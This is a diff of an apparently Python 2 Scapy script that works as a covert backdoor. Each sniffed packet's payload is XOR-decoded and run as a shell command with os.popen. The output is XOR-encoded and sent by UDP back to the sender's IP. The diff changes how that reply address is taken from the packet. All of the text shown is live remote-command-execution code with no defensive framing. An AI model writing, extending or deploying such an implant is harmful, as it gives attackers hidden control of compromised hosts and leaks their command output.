@@ -46,8 +46,9 @@ def customAction(packet):
     command = os.popen(xor_crypt(packet.load, decode=True))
     command_result = command.read()
     print command_result
-    dest_ip = packet.src
-    send(IP(dst=packet.src)/UDP(sport=DPORT, dport=SPORT)/xor_crypt(command_result, encode=True))
+    dest_ip = packet[0][1].src
+    print dest_ip
+    send(IP(dst=dest_ip)/UDP(sport=DPORT, dport=SPORT)/xor_crypt(command_result, encode=True))
     return "Packet Arrived" + ": " + packet[0][1].src + "==>" + packet[0][1].dst
 
 sniff(filter=FILTER, prn=customAction)
